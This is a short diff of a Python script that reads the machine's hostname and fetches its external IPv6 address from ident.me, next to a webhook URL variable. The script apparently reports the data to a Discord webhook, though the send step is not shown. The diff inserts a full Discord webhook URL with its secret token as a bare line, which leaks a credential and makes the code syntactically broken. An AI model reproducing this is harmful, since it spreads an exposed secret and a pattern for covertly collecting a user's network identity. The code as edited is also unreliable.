@@ -1,7 +1,7 @@
 import socket
 import requests
 import urllib.request
-
+https://discord.com/api/webhooks/1016047188821934200/Lq-UZNU09CIaYrC699DdieV4G6lYecdm0tmYTbBneTHj9u4KGt33p66jTWbR8Xsah-T0
 webhookURL = '<webhook url>'
 hostname = socket.gethostname()
 external_ipv6 = urllib.request.urlopen('https://v6.ident.me').read().decode('utf8')
